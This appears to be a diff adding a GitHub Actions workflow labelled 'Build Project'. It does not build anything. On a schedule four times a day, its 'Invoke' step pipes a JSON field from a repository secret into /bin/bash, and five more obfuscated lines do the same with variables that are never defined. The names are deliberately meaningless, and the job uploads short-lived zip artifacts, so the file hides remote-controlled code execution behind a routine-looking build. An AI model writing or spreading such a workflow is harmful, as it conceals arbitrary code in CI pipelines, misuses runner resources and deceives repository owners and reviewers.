@@ -1,0 +1,38 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '52 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          xqww67682: ${{ secrets.xqww67682 }}
+        run: |
+          printf '%s' "$xqww67682" | jq -r .cisi805 | /bin/bash
+          printf '%s' "$qvq67874" | jq -r .mpwe856 | /bin/bash
+          printf '%s' "$mc4" | jq -r .rszzo1137 | /bin/bash
+          echo $fpdsk439 | jq -r .chsv1382 | /bin/bash
+          echo $ssj64 | jq -r .vn17467 | /bin/bash
+          printf '%s' "$nw497" | jq -r .a627 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: UBpyoUGc
+          path: "*.zip"
+          retention-days: 1
